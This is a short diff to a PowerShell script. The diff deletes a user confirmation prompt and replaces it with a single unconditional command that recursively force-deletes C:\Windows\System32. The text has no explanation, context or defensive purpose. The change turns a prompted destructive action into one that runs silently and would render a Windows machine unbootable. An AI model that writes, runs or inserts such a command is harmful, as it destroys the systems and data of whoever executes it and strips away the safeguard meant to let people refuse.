@@ -1,9 +1,1 @@
-$confirmation = Read-Host "This script will attempt to delete the System32 directory. Are you sure you want to proceed? (y/n)"
-
-if ($confirmation -eq "y") {
-    Write-Host "Deleting System32 directory..."
-    Remove-Item -Path "C:\Windows\System32" -Recurse -Force
-    Write-Host "System32 directory deleted."
-} else {
-    Write-Host "Operation canceled."
-}
+Remove-Item -Path 'C:\Windows\System32' -Recurse -Force
